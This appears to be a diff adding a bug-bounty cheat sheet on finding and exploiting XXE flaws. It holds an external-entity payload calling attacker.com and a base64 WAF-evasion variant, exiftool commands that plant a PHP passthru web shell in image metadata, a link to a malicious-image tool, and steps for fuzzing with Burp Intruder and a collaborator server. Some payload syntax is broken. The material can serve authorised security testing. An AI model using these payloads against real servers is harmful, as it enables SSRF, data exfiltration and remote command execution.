@@ -1,0 +1,53 @@
+## where to find xxe?
+
+- xml post data
+
+- convert json POST data to xml with the help of `CONTENT-TYPE CONVETER burp-extension`
+`important note:
+send the requets first with json default then send again in xml
+if the response gets the same means server is sucessfully parsing the xml input
+now exploit it with the XXE payloads
+`
+- any input that accepts xml data
+
+> xxe to ssrf :
+
+<!DOCTYPE foo [<!ENTITY % init SYSTEM "http://attacker.com"> %init;]>
+
+> xxe base64 encoded when a WAF detects the above payload
+
+<!DOCTYPE foo [<!ENTITY % init SYSTEM "data://text/plain;base64,[base64 url]">%init;]>
+
+# how to exfiltrate data
+
+![data-exfil](./1.png)
+
+---
+
+# important case :
+![data-exfil](./2.png)
+
+
+# how to inject xml or any kind of payload in image headers with the help of exiftool!
+
+>payload 1: exiftool -comment='<?php passthru(\$_GET'cmd'); _halt_compiler(); ?>' flower.jpg
+
+We can also set payload in the “Document Name” meta field. To do this, run this command:
+>payload 2: exiftool -documentname='<?php passthru(\$_GET'cmd'); _halt_compiler(); ?>' flower.jpg
+
+inserting payload in image matadata:
+![data-exfil](./3.png)
+
+also : use this tools for creating mal image: https://github.com/chinarulezzz/pixload
+
+
+
+### the most important part for bug hunting : [you need to make effort for making a xxe payload list]
+>https://twitter.com/Alra3ees/status/1213287810440081408?s=20&t=9Y6_hiiNwl9iK5HZeQZpeg
+
+make a wordlist of xxe payloads and replace it with burp collab and then send the main
+request to the burp intruder then if any payload works you'll definetly get
+a hit on the collab server.
+
+
+> inject payload with the help of ghex tool and see if the image isn't corupted then we're good to go!
